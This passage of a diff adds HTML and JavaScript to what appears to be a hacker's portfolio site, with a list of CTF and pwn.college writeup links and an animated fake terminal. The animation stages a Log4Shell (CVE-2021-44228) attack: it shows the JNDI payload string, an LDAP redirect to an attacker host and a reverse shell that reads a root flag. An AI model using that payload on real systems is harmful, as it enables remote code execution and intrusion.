+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194364</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-35-sed/">Challenge Name: sed</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194365</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-34-awk/">Challenge Name: awk</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194366</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-33-whiptail/">Challenge Name: whiptail</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194367</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-32-socat/">Challenge Name: socat</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194368</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-31-watch/">Challenge Name: watch</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194369</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-30-setarch/">Challenge Name: setarch</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194370</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-29-stdbuf/">Challenge Name: stdbuf</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194371</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-28-timeout/">Challenge Name: timeout</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194372</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-27-nice/">Challenge Name: nice</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194373</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-26-make/">Challenge Name: make</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194374</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-25-find/">Challenge Name: find</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194375</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-24-env/">Challenge Name: env</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194376</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-23-genisoimage/">Challenge Name: genisoimage</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194377</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-22-cpio/">Challenge Name: cpio</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194378</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-21-ar/">Challenge Name: ar</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194379</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-20-tar/">Challenge Name: tar</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194380</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-19-zip/">Challenge Name: zip</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194381</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-18-bzip2/">Challenge Name: bzip2</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194382</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-17-gzip/">Challenge Name: gzip</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194383</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-16-split/">Challenge Name: split</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194384</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-15-base64/">Challenge Name: base64</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194385</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-14-base32/">Challenge Name: base32</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194386</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-13-xxd/">Challenge Name: xxd</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194387</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-12-hd/">Challenge Name: hd</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194388</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-11-od/">Challenge Name: od</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194389</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-10-rev/">Challenge Name: rev</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194390</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-09-nano/">Challenge Name: nano</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194391</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-08-emacs/">Challenge Name: emacs</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194392</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-07-vim/">Challenge Name: vim</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194393</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-06-sort/">Challenge Name: sort</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194394</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-05-head/">Challenge Name: head</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194395</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-04-tail/">Challenge Name: tail</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194396</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-03-less/">Challenge Name: less</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194397</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-02-more/">Challenge Name: more</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194398</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-01-cat/">Challenge Name: cat</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194399</td>
+                    <td class="ida-name"><a href="/writeups/nullcon-berlin-hackim-2025-ctf-misc-usbstorage/">Nullcon Berlin HackIM 2025 CTF – Misc: USB...</a></td>
+                    <td class="ida-seg">.ctf</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194400</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-29-mitm/">🕵️‍♂️ Man-in-the-Middle – Writeup (pwn.col...</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194401</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-28-intercept/">🛰️ Intercept – Writeup (pwn.college)</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194402</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-27-arp/">🧠 CTF Writeup: Manual ARP Packet Injection</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194403</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-26-udp-spoofing-4/">🛰️ UDP Spoofing 4 – Writeup (pwn.college)</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194404</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-25-udp-spoofing-3/">🛰️ UDP Spoofing 3 – Writeup (pwn.college)</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194405</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-24-udp-spoofing-2/">🛰️ UDP-spoofing-2 (pwn.college)</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194406</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-23-udp-spoofing-1/">✅ UDP-Spoofing-1 Challenge</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194407</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-22-udp2/">📡 UDP2 – 'Set the Source Port'</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194408</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-21-udp/">🛰️ UDP Challenge – 'First UDP Interaction'</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194409</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-20-tcp-handshake/">🤝 TCP Three-Way Handshake — pwn.college</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194410</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-19-tcp/">🔌 Transmission Control Protocol Packet — p...</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194411</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-18-ip/">🌐 Internet Protocol Packet — pwn.college</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194412</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-17-ethernet/">📡 Ethernet — pwn.college</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194413</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-16-denial-of-service-3/">Denial-of-service-3 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194414</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-15-denial-of-service-2/">🧨 Challenge Writeup: `dos2`</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194415</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-14-denial-of-service-1/">📌 Challenge Summary</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194416</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-13-firewall3/">Firewall3 🔥📤🧱</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194417</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-12-firewall2/">Firewall2 🔥🧱🎯</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194418</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-11-firewall1/">Firewall1 🔥🧱</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194419</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-10-network-configuration/">Network-Configuration 🌐🔧</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194420</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-09-sniffing-cookies/">Cookie-Sniffer 🕵️‍♂️🍪</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194421</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-08-monitor2/">🧪 Monitor2 Challenge – pwn.college</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194422</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-07-monitor1/">Monitor1 - Monitor Traffic from a Remote Host</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194423</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-06-scan1/">🛰️ Scan2 Challenge — pwn.college</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194424</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-05-scan1/">🔍 Scan1 Challenge</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194425</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-04-listen/">🔊 Challenge: Listen</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194426</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-03-shutdown/">🚩 Challenge: Shutdown</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194427</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-02-send/">🌐 Connect – Message Sending (pwn.college)</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194428</td>
+                    <td class="ida-name"><a href="/writeups/intercepting-communication-01-connect/">🌐 Connect – Writeup (pwn.college)</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194429</td>
+                    <td class="ida-name"><a href="/writeups/imaginaryctf-2025-rev-weird-app/">rev-weird-app</a></td>
+                    <td class="ida-seg">.ctf</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194430</td>
+                    <td class="ida-name"><a href="/writeups/imaginaryctf-2025-fore-wave/">ImaginaryCTF Forensics - wave</a></td>
+                    <td class="ida-seg">.ctf</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194431</td>
+                    <td class="ida-name"><a href="/writeups/imaginaryctf-2025-fore-obsuct/">ImaginaryCTF Forensic - obsuct</a></td>
+                    <td class="ida-seg">.ctf</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194432</td>
+                    <td class="ida-name"><a href="/writeups/cryptography-07-many-time-pad/">🧠 Many-time Pad — Cryptography Challenge W...</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194433</td>
+                    <td class="ida-name"><a href="/writeups/cryptography-06-one-time-pad-tamper/">🔐 One-Time Pad Tampering — Integrity Flaw ...</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194434</td>
+                    <td class="ida-name"><a href="/writeups/cryptography-05-one-time-padding/">🔐 One-Time Pad Decryption</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194435</td>
+                    <td class="ida-name"><a href="/writeups/cryptography-04-xoring-ascii-strings/">🔡 XORing ASCII Strings — Full-String XOR P...</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194436</td>
+                    <td class="ida-name"><a href="/writeups/cryptography-03-xoring-ascii/">🔤 XORing ASCII — XORing Characters Byte by...</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194437</td>
+                    <td class="ida-name"><a href="/writeups/cryptography-02-xoring-hex/">🔐 XORing Hex — Practice XOR with Hex Values</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194438</td>
+                    <td class="ida-name"><a href="/writeups/cryptography-01-xor/">🧠 XOR 101 — Intro to Bitwise Crypto</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194439</td>
+                    <td class="ida-name"><a href="/writeups/chall5-code/">Code</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194440</td>
+                    <td class="ida-name"><a href="/writeups/chall4-code/">Code</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194441</td>
+                    <td class="ida-name"><a href="/writeups/chall3-code/">------------------------------------------...</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194442</td>
+                    <td class="ida-name"><a href="/writeups/chall2-code/">Code</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194443</td>
+                    <td class="ida-name"><a href="/writeups/chall1-code/">Code</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+            </tbody>
+        </table>
+        </div>
+    </div>
+
+    <div class="docked-window">
+        <div class="window-header">
+            <span>Live Exploit Execution</span>
+            <span class="tag">CVE-2021-44228</span>
+        </div>
+        <div class="window-body padded cve-terminal" id="cve-anim"></div>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    const term = document.getElementById("cve-anim");
+    if (!term) return;
+
+    const lines = [
+        { text: "himanshu@kali:~$ ", cls: "cmd", delay: 1000 },
+        { text: "python3 log4shell_exploit.py --target http://10.10.11.242:8080\n", cls: "cmd", typing: true, delay: 500 },
+        { text: "[*] Initializing Log4Shell (CVE-2021-44228) exploit sequence...\n", cls: "info", delay: 800 },
+        { text: "[*] Starting local LDAP server on port 1389...\n", cls: "info", delay: 600 },
+        { text: "[+] LDAP server listening.\n", cls: "success", delay: 500 },
+        { text: "[*] Starting local HTTP server on port 8000 to host malicious class...\n", cls: "info", delay: 600 },
+        { text: "[+] HTTP server listening.\n", cls: "success", delay: 800 },
+        { text: "[*] Constructing JNDI injection payload...\n", cls: "warning", delay: 1000 },
+        { text: "    Payload: ${jndi:ldap://10.10.14.5:1389/Exploit}\n", cls: "cmd", delay: 500 },
+        { text: "[*] Sending payload to target http://10.10.11.242:8080 (User-Agent)...\n", cls: "warning", delay: 1500 },
+        { text: "[+] Target connected to LDAP server! Redirecting to HTTP server...\n", cls: "success", delay: 1200 },
+        { text: "[+] Target downloaded malicious Exploit.class!\n", cls: "success", delay: 800 },
+        { text: "[!] Triggering reverse shell to 10.10.14.5:4444...\n", cls: "danger", delay: 2000 },
+        { text: "\n[+] Connection received from 10.10.11.242:49182\n", cls: "success", delay: 800 },
+        { text: "root@target:/# ", cls: "danger", delay: 1000 },
+        { text: "whoami\n", cls: "cmd", typing: true, delay: 500 },
+        { text: "root\n", cls: "text-bright", delay: 500 },
+        { text: "root@target:/# ", cls: "danger", delay: 1000 },
+        { text: "cat /root/root.txt\n", cls: "cmd", typing: true, delay: 500 },
+        { text: "HTB{l0g4j_n3v3r_d13s_1337}\n", cls: "success", delay: 2000 },
+        { text: "root@target:/# ", cls: "danger", delay: 3000 }
+    ];
+
+    let currentLine = 0;
+    
+    function scrollToBottom() {
+        term.scrollTop = term.scrollHeight;
+    }
+
+    async function typeWriter(text, cls) {
+        const span = document.createElement("span");
+        if (cls) span.className = cls;
+        term.appendChild(span);
+        
+        for (let i = 0; i < text.length; i++) {
+            span.innerHTML += text.charAt(i);
+            scrollToBottom();
+            await new Promise(r => setTimeout(r, 30 + Math.random() * 40));
+        }
+    }
+
+    async function runAnim() {
+        term.innerHTML = ""; // clear
+        for (let i = 0; i < lines.length; i++) {
+            const line = lines[i];
+            
+            // Add cursor
+            const cursor = document.createElement("span");
+            cursor.className = "cve-cursor";
+            term.appendChild(cursor);
+            
+            await new Promise(r => setTimeout(r, line.delay));
+            
+            // Remove cursor for text entry
+            term.removeChild(cursor);
+            
+            if (line.typing) {
+                await typeWriter(line.text, line.cls);
+            } else {
+                const span = document.createElement("span");
+                if (line.cls) span.className = line.cls;
+                span.innerHTML = line.text;
+                term.appendChild(span);
+                scrollToBottom();
+            }
+        }
+        
+        // Final cursor
+        const finalCursor = document.createElement("span");
+        finalCursor.className = "cve-cursor";
+        term.appendChild(finalCursor);
+        
+        // Loop after delay
+        setTimeout(runAnim, 10000);
+    }
+    
+    runAnim();
+});
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    const input = document.getElementById("pwndbg-input");
+    const output = document.getElementById("pwndbg-output");
+    const panel = document.querySelector(".pwndbg-panel");
+
+    if (!input || !output) return;
+
+    // Auto focus when clicking anywhere in the panel
+    panel.addEventListener("click", () => {
+        input.focus();
+    });
+
+    const bioHtml = `
+        <span style="color: var(--text-main);">
+            I break things to understand how they work. <br>
+            Into memory corruption, binary analysis, and poking at game internals. <br>
+            This is where I document what I find.
+        </span>
+    `;
+
+    const socialsHtml = `
+        <span style="color: var(--syn-address);">HackTheBox</span>   : <a href="https://app.hackthebox.com/users/2410266" target="_blank" style="color: var(--syn-string);">https://app.hackthebox.com/users/2410266</a><br>
+        <span style="color: var(--syn-address);">Medium</span>       : <a href="https://medium.com/@HimanshuP601" target="_blank" style="color: var(--syn-string);">https://medium.com/@HimanshuP601</a><br>
+        <span style="color: var(--syn-address);">pwn.college</span>  : <a href="https://pwn.college/hacker/HimanshuP601" target="_blank" style="color: var(--syn-string);">https://pwn.college/hacker/HimanshuP601</a><br>
+        <span style="color: var(--syn-address);">GitHub</span>       : <a href="https://github.com/HimanshuP601" target="_blank" style="color: var(--syn-string);">https://github.com/HimanshuP601</a><br>
+        <span style="color: var(--syn-address);">LinkedIn</span>     : <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank" style="color: var(--syn-string);">https://www.linkedin.com/in/himanshuparate/</a>
+    `;
+
+    const helpHtml = `
+        <span style="color: var(--syn-instruction);">Available commands:</span><br>
+        <span style="color: var(--syn-address);">help</span>                 - Print this message<br>
+        <span style="color: var(--syn-address);">clear</span>                - Clear terminal history<br>
+        <span style="color: var(--syn-address);">whoami</span>               - Display current user<br>
+        <span style="color: var(--syn-address);">info proc bio</span>        - Display author bio<br>
+        <span style="color: var(--syn-address);">info proc socials</span>    - Display social links<br>
+        <span style="color: var(--syn-address);">checksec</span>             - Display binary mitigations<br>
+        <span style="color: var(--syn-address);">strings [file]</span>       - Search for readable strings in binary
+    `;
+
+    const checksecHtml = `
+        [*] '/home/himanshu/portfolio'<br>
+        <span style="color: var(--syn-success);">Arch:</span>     amd64-64-little<br>
+        <span style="color: var(--syn-success);">RELRO:</span>    Full RELRO<br>
+        <span style="color: var(--syn-success);">Stack:</span>    Canary found<br>
+        <span style="color: var(--syn-success);">NX:</span>       NX enabled<br>
+        <span style="color: var(--syn-success);">PIE:</span>      PIE enabled
+    `;
+
+    const asciiBanner = `
+        <pre style="color: var(--syn-danger); font-family: var(--font-mono); font-size: 0.6rem; font-weight: bold; margin-bottom: 1rem; line-height: 1.2;">
+ _  __  _    _    _    __  __ __  __ _   _ _   _ ___ 
+| |/ / / \\  / \\  / \\  |  \\/  |  \\/  | | | | | | |_ _|
+| ' / / _ \\/ _ \\/ _ \\ | |\\/| | |\\/| | | | | | | || | 
+| . \\/ ___ \\ ___ \\ ___ \\| |  | | |  | | |_| | |_| || | 
+|_|\\_\\_/   \\_\\_/   \\_\\_\\|_|  |_|_|  |_|\\___/ \\___/|___|
+        </pre>
+    `;
+
+    const stringsHtml = `
+        <span style="color: var(--text-muted); font-family: var(--font-mono); font-size: 0.8rem; white-space: pre;">
+00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|
+00000010  03 00 3e 00 01 00 00 00  60 10 40 00 00 00 00 00  |..>.....\`.@.....|
+00000020  46 4c 41 47 7b 79 30 75  5f 66 30 75 6e 64 5f 74  |<span style="color: var(--syn-danger); font-weight: bold;">FLAG{y0u_f0und_t</span>|
+00000030  68 33 5f 63 30 6e 73 30  6c 33 5f 73 33 63 72 33  |<span style="color: var(--syn-danger); font-weight: bold;">h3_c0ns0l3_s3cr3</span>|
+00000040  74 7d 00 00 00 00 00 00  40 00 00 00 00 00 00 00  |<span style="color: var(--syn-danger); font-weight: bold;">t}</span>......@.......|
+        </span>
+    `;
+
+    let commandHistory = [];
+    let historyIndex = -1;
+    const commandsList = ["help", "clear", "whoami", "info proc bio", "info proc socials", "checksec", "strings"];
+
+    input.addEventListener("keydown", function(e) {
+        if (e.key === "ArrowUp") {
+            e.preventDefault();
+            if (historyIndex < commandHistory.length - 1) {
+                historyIndex++;
+                input.value = commandHistory[commandHistory.length - 1 - historyIndex];
+            }
+            return;
+        }
+        if (e.key === "ArrowDown") {
+            e.preventDefault();
+            if (historyIndex > 0) {
+                historyIndex--;
+                input.value = commandHistory[commandHistory.length - 1 - historyIndex];
+            } else if (historyIndex === 0) {
+                historyIndex = -1;
+                input.value = "";
+            }
+            return;
+        }
+        if (e.key === "Tab") {
+            e.preventDefault();
+            const val = input.value.toLowerCase();
+            if (!val) return;
+            const match = commandsList.find(c => c.startsWith(val));
+            if (match) {
